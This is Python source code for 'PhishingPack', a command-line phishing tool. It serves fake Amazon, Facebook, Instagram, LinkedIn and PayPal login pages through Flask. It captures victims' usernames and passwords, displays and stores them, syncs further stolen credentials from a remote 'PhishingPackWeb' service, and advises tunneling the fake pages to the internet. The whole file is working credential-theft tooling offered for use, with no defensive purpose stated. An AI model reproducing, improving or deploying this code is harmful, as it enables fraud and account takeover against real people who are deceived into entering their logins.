from os import system, name, path
from rich.console import Console
from pyfiglet import figlet_format
from flask import Flask, render_template, request
from time import sleep
from json import dump, load
import os
from multiprocessing import Process
import atexit
from shutil import copy2
from threading import Thread
from socket import gethostbyname, gethostname
from contextlib import redirect_stdout, redirect_stderr
from getpass import getpass
import requests


console = Console(force_terminal=True)
app = Flask(__name__)

hostname = gethostname()
ip_address = gethostbyname(hostname)
PORT = 5150

API_URL = "https://phishingpackweb.onrender.com/api"
WEB_URL = "https://phishingpackweb.onrender.com"
default_web_templates = ["amazon", "facebook", "instagram", "linkedin", "paypal"]

default_web_templates_string = """
1. Amazon
2. Facebook
3. Instagram
4. Linkedin
5. Paypal
"""

help_string = """
[bright_blue]Help usage for PhishingPack![/bright_blue]
[bright_blue]============================[/bright_blue]

[yellow1]PhishingPack is a powerful phishing tool that makes it easy to perform phishing attacks. It is also highly customizable.[/yellow1]
[yellow3]Type 'exit' or press Ctrl+C to quit the program.[/yellow3]



[bright_white]Commands list:[/bright_white]
[bright_white]--------------[/bright_white]

[magenta2]--> server start[/magenta2]: Start the phishing webserver for the selected site template.

[magenta2]--> server stop[/magenta2]: Stop the currently running webserver if any.

[magenta2]--> server status[/magenta2]: Get the status of webserver.

[magenta2]--> server monitor[/magenta2]: Monitor the currently running webserver for data from the victom.

[magenta2]--> data display[/magenta2]: Display the data collected by the phishing webserver.

[magenta2]--> data clear[/magenta2]: Clear the data collected by the phishing webserver.

[magenta2]--> account status[/magenta2]: Get if you are logged in or not for PhishingPackWeb internet server.

[magenta2]--> account login[/magenta2]: Login to the PhishingPackWeb internet server.

[magenta2]--> account create[/magenta2]: Create a new account for PhishingPackWeb internet server.

[magenta2]--> web status[/magenta2]: Get info about the PhishingPackWeb internet server included template and more.

[magenta2]--> web template set[/magenta2]: Set or change the template for PhishingPackWeb internet server.

[magenta2]--> web template remove[/magenta2]: Remove the template of PhishingPackWeb internet server.

[magenta2]--> web data display[/magenta2]: Display the captured data from PhishingPackWeb internet server.

[magenta2]--> web data refresh[/magenta2]: Get the latest captured data from PhishingPackWeb internet server.

[magenta2]--> web data clear[/magenta2]: Clear all the captured data from PhishingPackWeb internet server.

[magenta2]--> help[/magenta2]: Display this help message.

[magenta2]--> clear[/magenta2]: Clear the console.

[magenta2]--> exit[/magenta2]: Quit the program.

"""


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/submit", methods=["POST"])
def submit():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        user_agent = request.form["user_agent"]
        time = request.form["time"]

        all_data = get_all_data()
        data_to_save = {
            "site": get_current_site(),
            "user_agent": user_agent,
            "time": time,
            "username": username,
            "password": password,
        }
        all_data.append(data_to_save)
        set_new_data(True)
        set_latest_data(data_to_save)

        with open("data.json", "w") as f:
            dump(all_data, f)

        current_site = get_current_site()
        site = get_site_from_name(current_site)
        return site["redirect_to"]


def all_sites_string():
    i = 1

    console.print(
        "\n\nChoose one of the following site template to start the server:\n",
        style="bright_yellow",
    )
    all_sites = get_all_sites()
    for site in all_sites:
        console.print(f"{i}. {site['name']}", style="sea_green1")
        i += 1


def get_all_data():
    with open("data.json", "r") as f:
        return load(f)


def get_all_sites():
    with open("config/sites.json", "r") as f:
        return load(f)


def get_site_from_name(name):
    all_sites = get_all_sites()
    for site in all_sites:
        if site["name"] == name:
            return site


def load_logs():
    with open("logs", "r") as f:
        return load(f)


def save_logs(data):
    with open("logs", "w") as f:
        dump(data, f)


def get_current_site():
    return load_logs()["current_site"]


def set_current_site(site):
    data = load_logs()
    data["current_site"] = site
    save_logs(data)


def get_monitor():
    return load_logs()["monitor"]


def set_monitor(arg):
    data = load_logs()
    data["monitor"] = arg
    save_logs(data)


def get_new_data():
    return load_logs()["new_data"]


def set_new_data(arg):
    data = load_logs()
    data["new_data"] = arg
    save_logs(data)


def get_latest_data():
    return load_logs()["latest_data"]


def set_latest_data(arg):
    data = load_logs()
    data["latest_data"] = arg
    save_logs(data)


def start_flask_server():
    with open(os.devnull, "w") as null:
        with redirect_stdout(null), redirect_stderr(null):
            app.run(host="0.0.0.0", port=PORT, debug=False)


def stop_flask_server():
    if server_process.is_alive():
        server_process.terminate()


def setSiteTemplate(site_name):
    site = get_site_from_name(site_name)
    source = f"templates/{site['template']}"
    dest = "templates/index.html"

    with open("templates/index.html", "w") as _f:
        pass
    copy2(source, dest)


def clear_console():
    if name == "nt":
        system("cls")
    else:
        system("clear")


def typing_animation(text, style="", sleep_time=0.05):
    for char in text:
        console.print(char, end="", style=style)
        sleep(sleep_time)
    print()


def monitor_data():
    set_latest_data({})
    set_new_data(False)

    while True:
        if not get_monitor():
            break
        sleep(1)
        if get_new_data():
            console.print("\nGot new data!", style="yellow1 bold")
            print(f"Site={get_latest_data()['site']}")
            print(f"UserAgent={get_latest_data()['user_agent']}")
            print(f"Time={get_latest_data()['time']}")
            print(f"username={get_latest_data()['username']}")
            print(f"password={get_latest_data()['password']}")
            print("\n")
            set_new_data(False)
            set_latest_data({})


def display_data():
    all_data = get_all_data()
    if len(all_data) == 0:
        console.print("\nNo data has been collected yet.\n", style="red")
    else:
        console.print("\nDisplay all collected data:\n", style="yellow1 bold")
        for data in all_data:
            print(f"Site={data['site']}")
            print(f"UserAgent={data['user_agent']}")
            print(f"Time={data['time']}")
            print(f"username={data['username']}")
            print(f"password={data['password']}")
            print("\n")


def internet_connection():
    try:
        requests.get(API_URL, timeout=5)
        return True
    except requests.ConnectionError:
        return False

def save_user(user):
    with open("config/user.json", "w") as f:
        dump(user, f)

def get_saved_user():
    try:
        with open("config/user.json", "r") as f:
            return load(f)
    except:
        console.print("\nYou are not logged in.", style="yellow")
        console.print("Use 'account login' to login or 'account create' to create a new account.\n")
        return None

def get_user_from_db():
    user = get_saved_user()
    if not user:
        return None
    response = requests.post(f"{API_URL}/authenticate", json={"username": user["username"], "password": user["password"]})
    json = response.json()
    if json.get("error"):
        console.print("\nYour credentials in config/user.json are invalid.\n", style="red")
        save_user({"username":"", "password":"", "template":"", "data":[]})
        return None
    return json["user"]

def account_login(username, password):
    if not internet_connection():
        console.print(
            "\nError! Please check your internet connection.\n", style="red bold"
        )
    elif len(username) < 4 or len(username) > 32:
        console.print(
            "\nError! Username must be between 4 and 32 characters.\n", style="red bold"
        )
    elif " " in username:
        console.print("\nError! Username must not contain spaces.\n", style="red bold")
    elif len(password) < 8:
        console.print(
            "\nError! Password must be atleast 8 characters long.\n", style="red bold"
        )
    else:
        response = requests.post(
            f"{API_URL}/authenticate", json={"username": username, "password": password}
        )
        json = response.json()
        if json.get("error"):
            console.print(f"\n{json["error"]}\n", style="red")
        else:
            console.print(f"\nLogged in as {json['user']['username']}!", style="green")
            console.print(f"Your template url is '{WEB_URL}?t={json['user']['_id']}'")
            console.print("Use 'web status' to check your template for PhishingPackWeb internet server.\n")
            json["user"]["password"] = password
            del json["user"]["_id"]
            save_user(json["user"])


def account_create(username, password):
    if not internet_connection():
        console.print(
            "\nError! Please check your internet connection.\n", style="red bold"
        )
    elif len(username) < 4 or len(username) > 32:
        console.print(
            "\nError! Username must be between 4 and 32 characters.\n", style="red bold"
        )
    elif " " in username:
        console.print("\nError! Username must not contain spaces.\n", style="red bold")
    elif len(password) < 8:
        console.print(
            "\nError! Password must be atleast 8 characters long.\n", style="red bold"
        )
    else:
        response = requests.post(
            f"{API_URL}/add-user", json={"username": username, "password": password}
        )
        json = response.json()
        if json.get("error"):
            console.print(f"\n{json['error']}\n", style="red")
        else:
            console.print(f"\nCreated account as {json['user']['username']}!", style="green")
            console.print(f"Your template url is '{WEB_URL}?t={json['user']['_id']}'")
            console.print("Use 'web template set' to set the template for PhishingPackWeb internet server.\n")
            json["user"]["password"] = password
            del json["user"]["_id"]
            save_user(json["user"])


def account_status():
    if not internet_connection():
        console.print(
            "\nError! Please check your internet connection.\n", style="red bold"
        )
        return

    user = get_user_from_db()
    if not user:
        return
    
    console.print(f"\nYou are logged in as {user['username']}!\n", style="green")

    
def web_status():
    if not internet_connection():
        console.print(
            "\nError! Please check your internet connection.\n", style="red bold"
        )
    else:
        user = get_user_from_db()
        if not user:
            return
        
        console.print(f"\nYou are logged in as {user['username']}!", style="green")
        if user["template"]:
            console.print(f"Your template is '{user['template']}'")
        else:
            console.print("You have not set any template yet.")
        console.print(f"Your template url is '{WEB_URL}?t={user['_id']}'\n")

def web_template_set(template):
    if not internet_connection():
        console.print(
            "\nError! Please check your internet connection.\n", style="red bold"
        )
    else:
        user = get_user_from_db()
        if not user:
            return
        
        response = requests.post(
            f"{API_URL}/set-template", json={"username": user["username"], "template": template}
        )
        json = response.json()
        if json.get("error"):
            console.print(f"\n{json['error']}\n", style="red")
        else:
            user = get_saved_user()
            user["template"] = template
            save_user(user)
            if template=="":
                console.print(f"\nTemplate removed!\n", style="green")
            else:
                console.print(f"\nTemplate set to '{template}'\n", style="green")

def web_data_display():
    user = get_saved_user()
    if not user:
        return
    
    all_data = user['data']
    if len(all_data) == 0:
        console.print("\nNo data has been collected yet from PhishingPackWeb.", style="red")
        console.print("Use 'web data refresh' to get latest data.\n")
    else:
        console.print("\nDisplay all collected data:\n", style="yellow1 bold")
        for data in all_data:
            print(f"Site={data['site']}")
            print(f"UserAgent={data['user_agent']}")
            print(f"Time={data['time']}")
            print(f"username={data['username']}")
            print(f"password={data['password']}")
            print("\n")

def web_data_refresh():
    if not internet_connection():
        console.print(
            "\nError! Please check your internet connection.\n", style="red bold"
        )
    else:
        user = get_user_from_db()
        if not user:
            return
        
        saved_user = get_saved_user()
        saved_user["data"] = user["data"]
        save_user(saved_user)
        console.print(f"\nLatest data has been fetched from the server.\n", style="green")


def web_data_clear():
    if not internet_connection():
        console.print(
            "\nError! Please check your internet connection.\n", style="red bold"
        )
    else:
        user = get_user_from_db()
        if not user:
            return
        
        response = requests.post(
            f"{API_URL}/clear-data", json={"username": user["username"]}
        )
        json = response.json()
        if json.get("error"):
            console.print(f"\n{json['error']}\n", style="red")
        else:
            user = get_saved_user()
            user["data"] = []
            save_user(user)
            console.print(f"\nData has been cleared for your PhishingPackWeb server.\n", style="green")


def check_for_files():
    try:
        with open("data.json", "r") as f:
            load(f)
    except:
        console.print("\nInvalid data.json file.", style="red")
        console.print("Please check the file and try again.", style="yellow bold")
        exit()

    try:
        with open("config/sites.json", "r") as f:
            load(f)
    except:
        console.print("\nInvalid sites.json file.", style="red")
        console.print("Please check the file and try again.", style="yellow bold")
        exit()

def web_server():
    """Create valid user.json if any error and fetches the latest data from the PhishingPackWeb server."""

    if internet_connection():
        try:
            with open("config/user.json", "r") as f:
                user =  load(f)
            response = requests.post(f"{API_URL}/authenticate", json={"username": user["username"], "password": user["password"]})
            json = response.json()

            if json.get("success"):
                user["data"] = json["user"]["data"]
                with open("config/user.json", "w") as f:
                    dump(user, f)
            else:
                with open("config/user.json", "w") as f:
                    dump({"username":"", "password":"", "template":"", "data":[]}, f)
        except:
            with open("config/user.json", "w") as f:
                dump({"username":"", "password":"", "template":"", "data":[]}, f)


def main():
    global server_process
    atexit.register(stop_flask_server)

    while True:
        console.print("PhishingPack >", style="bold spring_green2 underline", end="")
        command = input(" ")

        if command.strip() == "":
            continue
        elif command == "clear":
            clear_console()
        elif command == "exit":
            print("\n")
            typing_animation(
                "Exiting PhishingPack...", style="red bold", sleep_time=0.05
            )
            typing_animation(
                "Thank you for using PhishingPack.", sleep_time=0.01, style="bold green"
            )
            break
        elif command == "help":
            console.print(help_string)
        elif command == "server start":
            if server_process.is_alive():
                console.print("\nThe server is already running.\n", style="red")
            else:
                all_sites_string()
                all_sites = get_all_sites()

                site_input = input("\nSelect the site template: ")
                if not site_input.isdigit() or int(site_input) > len(all_sites):
                    console.print("\nInvalid template selection.\n", style="red")
                else:
                    site = all_sites[int(site_input) - 1]["name"]

                    set_current_site(site)
                    setSiteTemplate(site)
                    server_process = Process(target=start_flask_server)
                    server_process.start()
                    console.print(f"\nServer has started for {site} at", style="green")
                    console.log(f"http://127.0.0.1:{PORT}", style="light_sea_green")
                    console.log(f"http://{ip_address}:{PORT}", style="light_sea_green")
                    console.print(
                        "\nYou can also use localhost tunneling services like\nlocalhost.run, serveo, packetriot, telebit or ngrok\nto make this server availble to internet.",
                        style="light_sea_green bold",
                    )
                    print("\n\n")

        elif command == "server stop":
            if server_process.is_alive():
                server_process.terminate()
                set_current_site("")
                console.print("\nThe server has been terminated.\n", style="green")
            else:
                console.print("\nThe server is not running.\n", style="red")
        elif command == "server status":
            if server_process.is_alive():
                console.print(
                    f"\nThe server is running for {get_current_site()} phishing site.\n",
                    style="spring_green2 bold",
                )
            else:
                console.print("\nThe server is not running.\n", style="yellow2 bold")
        elif command == "server monitor":
            if server_process.is_alive():
                clear_console()
                console.print(
                    f"\nMonitoring {get_current_site()} phishing site...",
                    style="dodger_blue2",
                )
                console.print(
                    "\nLooking for data from the site...", style="dodger_blue2"
                )
                console.print("Type 'q' to quit.\n", style="green")
                set_monitor(True)
                Thread(target=monitor_data, daemon=True).start()
                while True:
                    inp = input("")
                    if inp == "q":
                        clear_console()
                        set_monitor(False)
                        set_new_data(False)
                        set_latest_data({})
                        console.print(
                            "\nStopped monitoring the server.\n", style="green"
                        )
                        break
            else:
                console.print("\nThe server is not running.\n", style="red")
        elif command == "data display":
            display_data()
        elif command == "data clear":
            with open("data.json", "w") as f:
                dump([], f)
            console.print("\nData has been cleared.\n", style="green")
        elif command == "account status":
            account_status()
        elif command == "account login":
            username = input("\nEnter your username: ")
            password = getpass("Enter your password (will not display for security): ")
            account_login(username, password)
        elif command == "account create":
            username = input("\nEnter your username (with no spaces): ")
            password = getpass("Enter your password (will not display for security): ")
            account_create(username, password)
        elif command == "web status":
            web_status()
        elif command == "web template set":
            console.print("\nSelect one of the following templates:", style="yellow1")
            console.print(default_web_templates_string, style="sea_green1")
            template = input("\nSelect the template: ")
            web_template_set(default_web_templates[int(template)-1])
        elif command == "web template remove":
            web_template_set("")
        elif command == "web data display":
            web_data_display()
        elif command == "web data refresh":
            web_data_refresh()
        elif command == "web data clear":
            web_data_clear()
        else:
            console.print("\nCommand not found. Type 'help' for help.\n", style="red")

    stop_flask_server()


def start():
    clear_console()

    print("\n")
    text = figlet_format("PhishingPack", font="big")
    typing_animation(text, sleep_time=0.005, style="sea_green2 bold")
    print("\n")
    console.print(
        "PhishingPack developed by ByteEncrypt.",
        style="bold royal_blue1",
    )
    console.print(
        "PhishingPack is a phishing tool written in Python,\nthat provides built-in phishing web pages for popular sites to collect credentials.",
        style="royal_blue1",
    )
    console.print(
        "Use 'help' for help and usage.",
        style="light_sea_green",
    )
    print("\n")

    try:
        main()
    except:
        console.print("\n\nPhishingPack Interrupted!", style="red")


if __name__ == "__main__":
    # Creating logs file
    with open("logs", "w") as f:
        dump(
            {
                "current_site": "",
                "monitor": False,
                "new_data": False,
                "latest_data": {},
            },
            f,
        )

    # Creating data file if not exist
    if not path.exists("data.json"):
        with open("data.json", "w") as f:
            dump([], f)

    check_for_files()

    Thread(target=web_server, daemon=True).start()
    server_process = Process(target=start_flask_server)
    start()
